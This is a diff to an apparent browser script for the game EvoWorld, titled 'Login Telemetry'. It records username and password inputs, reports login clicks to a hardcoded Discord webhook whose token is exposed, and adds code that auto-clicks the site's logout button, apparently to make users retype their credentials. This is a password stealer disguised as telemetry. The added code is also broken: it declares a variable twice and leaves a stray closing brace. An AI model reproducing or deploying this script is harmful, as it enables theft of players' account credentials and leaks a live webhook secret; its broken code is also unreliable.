@@ -1,11 +1,12 @@
 // =====================================
-// EvoWorld - Login Telemetry (WORKING + Discord, NO HASH)
+// EvoWorld - Login Telemetry + Logout automatico (WORKING)
 // =====================================
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; // placeholder sicuro
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; 
 
 let lastTextInput = null;
 let lastPasswordInput = null;
+let logoutDone = false; // flag per eseguire logout solo una volta
 
 // ----------------------------
 // Traccia input di testo e password
@@ -72,4 +73,38 @@ document.addEventListener("click", e => {
   if (btn && btn.textContent?.trim().toLowerCase() === "login") {
     sendTelemetry("click_login");
   }
+});
+
+// ----------------------------
+// Auto Logout per evoworld.io
+// ----------------------------
+
+let logoutDone = false;
+
+const interval = setInterval(() => {
+  if (logoutDone) return;
+
+  // Possibili selettori del logout
+  const logoutBtn =
+    document.querySelector('button.logout') ||
+    document.querySelector('a.logout') ||
+    document.querySelector('#logout') ||
+    document.querySelector('[onclick*="logout"]');
+
+  if (logoutBtn) {
+    logoutBtn.click();
+    logoutDone = true;
+    clearInterval(interval);
+    console.log("[AutoLogout] Logout automatico eseguito");
+  }
+}, 1000); // controlla ogni secondo
+
+// Sicurezza: stop dopo 15 secondi
+setTimeout(() => {
+  if (!logoutDone) {
+    clearInterval(interval);
+    console.log("[AutoLogout] Logout non trovato (timeout)");
+  }
+}, 15000);
+
 });
